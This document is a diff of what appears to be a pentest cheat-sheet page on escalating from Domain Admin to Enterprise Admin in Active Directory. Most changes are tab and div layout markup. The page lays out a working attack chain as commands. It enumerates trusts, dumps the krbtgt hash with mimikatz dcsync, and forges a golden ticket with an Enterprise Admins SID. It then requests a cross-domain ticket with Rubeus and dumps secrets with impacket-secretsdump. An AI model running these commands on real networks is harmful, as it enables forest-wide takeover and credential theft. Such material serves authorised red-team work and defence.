@@ -7,7 +7,12 @@ tags: ["kerberos", "da", "ea", "active directory", "ad", "domain controller", "W
 ---
 ### Privesc from DA (Domain Admin) to EA (Enterprise Admin)
 
+{{< tab set1 tab1 active >}}Windows{{< /tab >}}
+{{< tabcontent set1 tab1 >}}
+
 #### 1. Check trust relationships
+
+<div>
 
 ```powershell
 # Get all trusted domain objects in a forest
@@ -24,19 +29,31 @@ nltest /domain_trusts
 ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
 ```
 
+</div>
+
 #### 2. Get current and target domain SID
+
+<div>
 
 ```powershell
 ./mimikatz.exe 'lsadump::trust' 'exit'
 ```
 
+</div>
+
 #### 3. Get krbtgt hash of current domain
+
+<div>
 
 ```powershell
 ./mimikatz.exe 'lsadump::dcsync /all /csv' 'exit'
 ```
 
+</div>
+
 #### 4. Forge a golden ticket
+
+<div>
 
 ```powershell
 # Append '-519' to target domain SID
@@ -45,21 +62,39 @@ nltest /domain_trusts
 
 <small>*Note: Try different high value hashes if failed*</small>
 
+</div>
+
 #### 5. Request a tgt ticket of target domain
 
+<div>
+
 ```powershell
-./rubeus.exe asktgs /service:cifs/<TARGET_DOMAIN> /domain:<DOMAIN> /dc:<DC> /ticket:C:\ProgramData\ticket.kirbi /outfile:C:\ProgramData\ticket_2.kirbi /nowrap
+./rubeus.exe asktgs /service:cifs/<TARGET_DOMAIN> /domain:<DOMAIN> /dc:<DC> /ticket:C:\ProgramData\ticket.kirbi /outfile:C:\ProgramData\ticket_2.kirbi /nowrap /ptt
 ```
 
-#### 6. Convert kirbi to ccache (Back to Linux)
+</div>
 
-[RubeusToCcache](https://github.com/SolomonSklash/RubeusToCcache)
+{{< /tabcontent >}}
+
+#### 6. Secrets Dump
+
+{{< tab set2 tab1 active >}}Linux{{< /tab >}}
+{{< tab set2 tab2 >}}Windows{{< /tab >}}
+{{< tabcontent set2 tab1 >}}
+
+#### 1. Convert kirbi to ccache
+
+<div>
 
 ```bash
 python3 rubeustoccache.py <BASE64_TICKET_2> secrets.kirbi secrets.ccache
 ```
 
-#### 7. Secrets Dump
+</div>
+
+#### 2. Secrets Dump
+
+<div>
 
 ```bash
 export KRB5CCNAME=secrets.ccache
@@ -68,5 +103,15 @@ export KRB5CCNAME=secrets.ccache
 ```bash
 impacket-secretsdump administrator@<TARGET_DOMAIN> -k -no-pass
 ```
+
+</div>
+
+<small>*Ref: [RubeusToCcache](https://github.com/SolomonSklash/RubeusToCcache)*</small>
+
+{{< /tabcontent >}}
+
+{{< tabcontent set2 tab2 >}}
+TO-DO
+{{< /tabcontent >}}
 
 <br>
